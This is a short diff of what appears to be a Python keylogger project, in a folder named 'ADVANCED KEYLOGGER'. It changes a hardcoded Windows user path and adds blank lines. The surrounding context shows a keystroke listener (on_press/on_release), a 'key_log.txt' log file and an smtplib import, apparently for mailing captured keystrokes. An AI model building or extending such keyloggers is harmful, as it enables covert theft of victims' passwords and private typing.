@@ -39,7 +39,7 @@ import smtplib
 
 keys_info = "key_log.txt"
 
-file_path = "C:\\Users\\asapa\\Desktop\\ADVANCED KEYLOGGER\\project"
+file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 
 count = 0
@@ -74,3 +74,5 @@ def on_release(key):
     
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+    
